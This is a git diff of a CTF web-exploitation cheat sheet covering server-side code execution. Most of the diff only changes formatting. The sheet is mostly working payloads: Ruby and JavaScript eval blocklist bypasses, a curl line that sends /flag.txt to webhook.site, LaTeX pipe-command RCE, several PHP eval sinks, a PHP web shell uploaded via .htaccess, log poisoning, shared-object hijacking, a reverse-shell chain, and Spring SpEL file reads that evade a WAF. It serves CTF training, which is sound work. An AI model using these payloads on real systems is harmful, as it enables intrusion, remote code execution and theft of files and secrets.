@@ -1,7 +1,6 @@
 # CTF Web - Server-Side Code Execution & Access Attacks
 
 ## Table of Contents
-
 - [Ruby Code Injection](#ruby-code-injection)
   - [instance_eval Breakout](#instance_eval-breakout)
   - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
@@ -35,12 +34,11 @@ For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggli
 
 *See also: [server-side-exec-2.md](server-side-exec-2.md) for SQLi keyword fragmentation bypass, SQL WHERE ORDER BY bypass, SQL injection via DNS records, bash brace expansion, Common Lisp reader macro injection, PHP7 OPcache + LD_PRELOAD bypass, wget filename trick, tar filename injection, PNG/PHP polyglot upload, editor backup file disclosure, date -f file read, Apache mod_rewrite bypass, and PHP ReDoS code skip.*
 
-------
+---
 
 ## Ruby Code Injection
 
 ### instance_eval Breakout
-
 ```ruby
 # Template: apply_METHOD('VALUE')
 # Inject VALUE as: valid');PAYLOAD#
@@ -48,16 +46,14 @@ For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggli
 ```
 
 ### Bypassing Keyword Blocklists
-
-| Blocked         | Alternative                                 |
-| --------------- | ------------------------------------------- |
-| `File.read`     | `Kernel#open` or class helper methods       |
-| `File.write`    | `open('path','w'){|f|f.write(data)}`        |
+| Blocked | Alternative |
+|---------|-------------|
+| `File.read` | `Kernel#open` or class helper methods |
+| `File.write` | `open('path','w'){|f|f.write(data)}` |
 | `system`/`exec` | `open('\|cmd')`, `%x[cmd]`, `Process.spawn` |
-| `IO`            | `Kernel#open`                               |
+| `IO` | `Kernel#open` |
 
 ### Exfiltration
-
 ```ruby
 open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
 # Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
@@ -65,7 +61,7 @@ open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
 
 **Key insight:** Ruby's `instance_eval` and `Kernel#open` are common injection sinks. When keywords like `File`, `system`, or `IO` are blocked, use `open('|cmd')` or `Process.spawn` -- Ruby has many built-in ways to execute commands that bypass simple blocklists.
 
-------
+---
 
 ## Ruby ObjectSpace Memory Scanning for Flag Extraction (Tokyo Westerns 2016)
 
@@ -89,12 +85,10 @@ p.method(:flag).call
 
 **Key insight:** Ruby's `ObjectSpace.each_object(String)` iterates every live String in the Ruby heap, including those stored in private variables or internal state. Filter by known flag prefix to extract the flag even when no direct reference exists.
 
-------
+---
 
 ## Perl open() RCE
-
 Legacy 2-argument `open()` allows command injection:
-
 ```perl
 open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
 # Exploit: "|command_here" or "command|"
@@ -102,14 +96,13 @@ open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
 
 **Key insight:** Perl's 2-argument `open()` interprets mode characters in the filename itself. A leading or trailing pipe (`|`) causes command execution. Any Perl CGI or backend that opens a user-supplied filename with the 2-arg form is vulnerable to RCE.
 
-------
+---
 
 ## LaTeX Injection RCE (Hack.lu CTF 2012)
 
 **Pattern:** Web applications that compile user-supplied LaTeX (PDF generation services, scientific paper renderers) allow command execution via `\input` with pipe syntax.
 
 **Read files:**
-
 ```latex
 \begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
 \edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
@@ -117,7 +110,6 @@ open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
 ```
 
 **Execute commands:**
-
 ```latex
 \input{|"id"}
 \input{|"ls /home/"}
@@ -125,7 +117,6 @@ open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
 ```
 
 **Full payload as standalone document:**
-
 ```latex
 \documentclass{article}
 \begin{document}
@@ -139,12 +130,11 @@ open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
 
 **Detection:** Any endpoint accepting `.tex` input, PDF preview/compile services, or "render LaTeX" functionality.
 
-------
+---
 
 ## Server-Side JS eval Blocklist Bypass
 
 **Bypass via string concatenation in bracket notation:**
-
 ```javascript
 row['con'+'structor']['con'+'structor']('return this')()
 // Also: template literals, String.fromCharCode, reverse string
@@ -152,7 +142,7 @@ row['con'+'structor']['con'+'structor']('return this')()
 
 **Key insight:** JavaScript `eval` blocklists filtering keywords like `require`, `process`, or `constructor` are bypassed with string concatenation in bracket notation. `['con'+'structor']` accesses `Function` constructor, which creates functions from strings -- equivalent to `eval` with no keyword to block.
 
-------
+---
 
 ## PHP preg_replace /e Modifier RCE (PlaidCTF 2014)
 
@@ -166,7 +156,6 @@ $replacement = 'system("cat /flag")';
 ```
 
 **Via object injection (POP chain):**
-
 ```php
 // Craft serialized object with OutputFilter containing /e pattern
 $filter = new OutputFilter("/^./e", 'system("cat /flag")');
@@ -176,7 +165,7 @@ $cookie = serialize($filter);
 
 **Key insight:** The `/e` modifier (deprecated in PHP 5.5, removed in PHP 7.0) turns `preg_replace` into an eval sink. In CTFs targeting PHP 5.x, check for `/e` in regex patterns. Combined with `unserialize()`, this enables RCE through POP gadget chains that set both pattern and replacement.
 
-------
+---
 
 ## PHP Backtick Eval Under Character Limit (EasyCTF 2017)
 
@@ -198,7 +187,6 @@ echo`ls`;
 ```
 
 **Character count comparison:**
-
 ```text
 echo`cat *`;              // 12 chars - read all files
 echo`ls`;                 // 9 chars  - list directory
@@ -209,7 +197,7 @@ exec('id');               // 11 chars - also standard
 
 **Key insight:** PHP backticks are equivalent to `shell_exec()`. When `eval()` input has a character limit, `` echo`cmd` `` provides shell execution in as few as 8 characters. The `$_GET[0]` trick moves the actual payload to a URL parameter, effectively bypassing the character limit entirely while keeping the eval payload minimal.
 
-------
+---
 
 ## PHP assert() String Evaluation Injection (CSAW CTF 2016)
 
@@ -231,7 +219,7 @@ assert("strpos('$page', '..') === false");
 
 **Key insight:** PHP `assert()` with string arguments acts like `eval()`. This was deprecated in PHP 7.2 and removed in PHP 8.0, but legacy applications remain vulnerable. Look for `assert()` in source code (especially via exposed `.git` directories).
 
-------
+---
 
 ## Prolog Injection (PoliCTF 2015)
 
@@ -248,7 +236,7 @@ assert("strpos('$page', '..') === false");
 
 **Key insight:** Prolog goals are chained with `,` (AND). Injecting `3), exec(cmd)` closes the original predicate and appends arbitrary Prolog goals. Similar to SQL injection but for logic programming backends. Also check for `process_create/3` and `read_file_to_string/3` as alternatives to `exec`.
 
-------
+---
 
 ## ReDoS as Timing Oracle
 
@@ -266,25 +254,22 @@ def leak_char(known_prefix, position):
 
 **Combine with path traversal** to target `/proc/1/environ` (secrets), `/proc/self/cmdline`.
 
-------
+---
 
 ## File Upload to RCE Techniques
 
 **Key insight:** File upload vulnerabilities become RCE when you can control either the file extension (`.htaccess`, `.php`, `.so`) or the upload path (path traversal). Try uploading server config files (`.htaccess`), shared libraries (`.so`), or use log poisoning as fallback when direct code upload is blocked.
 
 ### .htaccess Upload Bypass
-
 1. Upload `.htaccess`: `AddType application/x-httpd-php .lol`
 2. Upload `rce.lol`: `<?php system($_GET['cmd']); ?>`
 3. Access `rce.lol?cmd=cat+flag.txt`
 
 ### PHP Log Poisoning
-
 1. PHP payload in User-Agent header
 2. Path traversal to include: `....//....//....//var/log/apache2/access.log`
 
 ### Python .so Hijacking (by Siunam)
-
 1. Compile: `gcc -shared -fPIC -o auth.so malicious.c` with `__attribute__((constructor))`
 2. Upload via path traversal: `{"filename": "../utils/auth.so"}`
 3. Delete .pyc to force reimport: `{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}`
@@ -292,28 +277,24 @@ def leak_char(known_prefix, position):
 Reference: https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/
 
 ### Gogs Symlink RCE (CVE-2025-8110)
-
 1. Create repo, `ln -s .git/config malicious_link`, push
 2. API update `malicious_link` → overwrites `.git/config`
 3. Inject `core.sshCommand` with reverse shell
 
 ### ZipSlip + SQLi
-
 Upload zip with symlinks for file read, path traversal for file write.
 
-------
+---
 
 ## PHP Deserialization from Cookies
-
 ```php
 O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
 ```
-
 Replace cookie with base64-encoded malicious serialized data.
 
 **Key insight:** PHP cookies containing base64-encoded data are likely `unserialize()` targets. Craft a serialized object with a `path` property pointing to `flag.txt` or inject a POP chain for RCE. Decode the existing cookie first to identify the class name and property structure.
 
-------
+---
 
 ## PHP extract() / register_globals Variable Overwrite (SecuInside 2013)
 
@@ -323,19 +304,17 @@ Replace cookie with base64-encoded malicious serialized data.
 // Vulnerable pattern
 if (!ini_get("register_globals")) extract($_GET);
 // Attacker-controlled: $_BHVAR['db']['host'], $_BHVAR['path_layout'], etc.
-
 ```
 
 ```text
 GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
-
 ```
 
 **Key insight:** `extract()` imports array keys as local variables. Overwrite database connection parameters to point to an attacker-controlled MySQL server, then return crafted query results (file paths, credentials, etc.).
 
 **Detection:** Search source for `extract($_GET)`, `extract($_POST)`, `extract($_REQUEST)`. PHP `register_globals` (removed in 5.4) had the same effect globally.
 
-------
+---
 
 ## XPath Blind Injection (BaltCTF 2013)
 
@@ -352,59 +331,50 @@ for pos in range(1, 100):
         payload = f"1' and substring(normalize-space(../../../node()),{pos},1)='{c}' and '2'='2"
         if len(requests.get(url, params={'sort': payload}).text) > 1050:
             result += c; break
-
 ```
 
 **Key insight:** XPath injection is similar to SQL injection but targets XML data stores. `normalize-space()` strips whitespace, `../../../` traverses the XML tree. Boolean oracle via response size differences (true queries return more results).
 
-------
+---
 
 ## API Filter/Query Parameter Injection
 
 **Pattern (Poacher Supply Chain):** API accepts JSON filter. Adding extra fields exposes internal data.
-
 ```bash
 # UI sends: filter={"region":"all"}
 # Inject:   filter={"region":"all","caseId":"*"}
 # May return: case_detail, notes, proof codes
-
 ```
 
-------
+---
 
 ## HTTP Response Header Data Hiding
 
 Proof/flag in custom response headers (e.g., `x-archive-tag`, `x-flag`):
-
 ```bash
 curl -sI "https://target/api/endpoint?seed=<seed>"
 curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
-
 ```
 
 **Key insight:** Flags and proof codes hidden in custom HTTP response headers (e.g., `x-flag`, `x-archive-tag`) are invisible in browser-rendered responses. Always inspect response headers with `curl -sI` or browser dev tools, especially for API endpoints.
 
-------
+---
 
 ## WebSocket Mass Assignment
-
 ```json
 {"username": "user", "isAdmin": true}
-
 ```
-
 Handler doesn't filter fields → privilege escalation.
 
 **Key insight:** WebSocket handlers that directly map JSON properties to objects without whitelisting allow mass assignment. Add privileged fields like `isAdmin`, `role`, or `balance` to the JSON payload -- if the server doesn't explicitly filter them, they overwrite the corresponding object properties.
 
-------
+---
 
 ## Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)
 
 **Pattern (Sugar Heist):** Spring Boot app with Thymeleaf template preview endpoint. WAF blocks standard file I/O classes (`Runtime`, `ProcessBuilder`, `FileInputStream`) but not Spring framework utilities.
 
 **Attack chain:**
-
 1. **Mass assignment** to gain admin role (add `"role": "ADMIN"` to registration JSON)
 2. **SpEL injection** via template preview endpoint
 3. **WAF bypass** using `org.springframework.util.FileCopyUtils` instead of blocked classes
@@ -426,22 +396,19 @@ curl -X POST http://target/api/admin/preview \
   -H "Content-Type: application/json" \
   -H "X-Api-Token: <token>" \
   -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
-
 ```
 
 **Key insight:** Distroless containers have no shell (`/bin/sh`), making `Runtime.exec()` useless even without WAF. Spring's `FileCopyUtils.copyToByteArray()` reads files without spawning processes. String concatenation (`"fl"+"ag.txt"`) bypasses static keyword matching in WAFs.
 
 **Alternative SpEL file read payloads:**
-
 ```text
 ${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/flag.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
 ${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag.txt")))}
-
 ```
 
 **Detection:** Spring Boot with `/api/admin/preview` or similar template rendering endpoint. Thymeleaf error messages in responses. `X-Api-Token` header pattern.
 
-------
+---
 
 ## PHP eval() Function-Regex Bypass via current(getallheaders()) (RCTF 2018)
 
@@ -452,7 +419,6 @@ ${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/fl
 ```bash
 curl "http://target/?cmd=eval(current(getallheaders()));" \
      -H "Zzz: system('cat /flag');"
-
 ```
 
 - `getallheaders()` returns an associative array of the request headers.
@@ -463,14 +429,13 @@ curl "http://target/?cmd=eval(current(getallheaders()));" \
 
 **References:** RCTF 2018 — writeup 10150
 
-------
+---
 
 ## Python f-string Format Injection Blind Extraction (Meepwn CTF Quals 2018)
 
 **Pattern:** A Python 3.6+ application evaluates user-controlled content inside an f-string template (`f"... {user} ..."`). Explicit quotes are filtered, so `{FLAG}` returns the flag's `repr()` but the attacker cannot concatenate strings or call functions with string arguments.
 
 **Bypass — boolean short-circuit + format spec:**
-
 ```python
 # The f-string spec lets you use comparisons and arithmetic inside {}.
 # `FLAG > 'c'` evaluates to True or False depending on lexicographic order.
@@ -479,7 +444,6 @@ curl "http://target/?cmd=eval(current(getallheaders()));" \
 # oracle that reveals 'FLAG[0] > c' per request.
 payload = "{FLAG>'c' or 14:x}"
 # Request returns "True" or "e" — the attacker reads one comparison bit.
-
 ```
 
 Iterate the comparison character to binary-search each byte of `FLAG` without ever emitting a forbidden quote outside the template.
@@ -488,6 +452,6 @@ Iterate the comparison character to binary-search each byte of `FLAG` without ev
 
 **References:** Meepwn CTF Quals 2018 — writeups 10433, 10434
 
-------
+---
 
 *See also: [server-side.md](server-side.md) for core injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion).*
